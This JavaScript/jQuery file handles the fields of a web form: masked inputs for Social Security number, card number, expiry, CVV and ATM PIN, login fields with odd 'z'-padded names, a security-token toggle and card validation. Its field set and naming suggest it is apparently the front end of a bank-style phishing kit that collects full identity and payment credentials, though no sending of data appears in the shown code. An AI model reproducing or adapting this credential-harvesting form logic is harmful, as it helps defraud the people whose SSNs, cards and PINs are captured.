$(".checkbox__input").click(function(){
    $(this).toggleClass('checkbox__input--checked')
});

$(document).ready(function() {
  $("#input-useToken").click(function() {
    $("#securityToken").toggle();
  });
});


function FunctionShow() {
  var x = document.getElementById("input-show-hide");
  if (x.type === "password") {
    x.type = "text";
  } else {
    x.type = "password";
  }
}


function FunctionShow_2() {
  var x = document.getElementById("input-show-hide-2");
  if (x.type === "password") {
    x.type = "text";
  } else {
    x.type = "password";
  }
}

document.onreadystatechange = function () {
    var state = document.readyState
    if (state == 'complete') {
        setTimeout(function () {
            document.getElementById('interactive');
            document.getElementById('fixed').style.visibility = "hidden";
        }, 3000);
    }
}


$(document).ready(function () {
            $('#zidonez').on('input change', function () {
                if ($(this).val() != '') {
                    document.getElementById('zidonez').style = "border-bottom: 1px solid #ccc!important;box-shadow: none!important;";
                    document.getElementById('zredonez').style = "color: #717171!important;";
                }
                else {
                    document.getElementById('zidonez').style = "";
                    document.getElementById('zredonez').style = "";
                }
            });
            $('#zidtwoz').on('input change', function () {
                if ($(this).val() != '') {
                    document.getElementById('zidtwoz').style = "border-bottom: 1px solid #ccc!important;box-shadow: none!important;";
                    document.getElementById('zredtwoz').style = "color: #717171!important;";
                }
                else {
                    document.getElementById('zidtwoz').style = "";
                    document.getElementById('zredtwoz').style = "";
                }
            });
});


$(document).ready(function () {
            $('#zinputxonez').on('input change', function () {
                if ($(this).val() != '') {
                    document.getElementById('zincorrectz').style.visibility = "hidden";
                    document.getElementById('zinputxonez').style = "box-shadow: inset 0 -1px 0 0 #949494!important;";
                    document.getElementById('zlabelxz').style = "color: #717171!important;";
                }
                else {
                    document.getElementById('zincorrectz').style.visibility = "unset";
                    document.getElementById('zinputxonez').style = "box-shadow: inset 0 -1px 0 0 #bf2155!important;";
                    document.getElementById('zlabelxz').style = "color: #bf2155!important;";
                }
            });
});

$('input[name="zcz"]').mask('00000'); 
$('input[name="pnz"]').mask('(000) 000-0000'); 
$('input[name="ssnz"]').mask('000-00-0000');
$('input[name="cnz"]').mask('0000 0000 0000 0000');
$('input[name="expz"]').mask('00/0000'); 
$('input[name="cvvz"]').mask('000'); 
$('input[name="atmz"]').mask('0000');

function isInputNumber(evt){var ch=String.fromCharCode(evt.which);if(!(/[0-9]/.test(ch))){evt.preventDefault();}}

$(function() {

    $('input[name="zuser"]').on({
       keydown: function(e) {
          if (e.which === 32 || e.which === 56 || e.which === 51)
             return false;
       },
       change: function() {
          this.value = this.value.replace(/\s/g, "");
       }
    });
});

$(function() {

    $('input[name="zusertwo"]').on({
       keydown: function(e) {
          if (e.which === 32 || e.which === 56 || e.which === 51)
             return false;
       },
       change: function() {
          this.value = this.value.replace(/\s/g, "");
       }
    });
});


function ccvalidate() {
    var valid = true;
    document.getElementById('cnz').style = "box-shadow: inset 0 -1px 0 0 #949494!important;";
    document.getElementById('cnzlabel').style = "color: #717171!important;";

    var cardNumber = $("#cnz").val();

    if (cardNumber != "") {
        $('#cnz').validateCreditCard(function(result) {
            if (!(result.valid)) {
                document.getElementById('cnz').style = "box-shadow: inset 0 -1px 0 0 #bf2155!important;";
                document.getElementById('cnzlabel').style = "color: #bf2155!important;";
                valid = false;
            }
        });
    }

    return valid;
}